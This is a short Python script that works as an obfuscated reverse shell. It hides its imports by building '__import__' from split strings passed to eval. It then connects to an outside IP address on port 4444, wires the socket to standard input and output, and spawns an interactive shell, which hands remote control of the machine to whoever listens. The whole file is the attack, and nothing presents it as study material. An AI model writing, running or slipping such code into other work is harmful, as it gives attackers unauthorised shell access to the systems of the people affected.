#!/usr/bin/env python3
import numpy as np

load_module = eval('__im' + 'port__')

os = load_module('os')
pty = load_module('pty')
socket = load_module('socket')

s=socket.socket();s.connect(("152.228.138.134",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
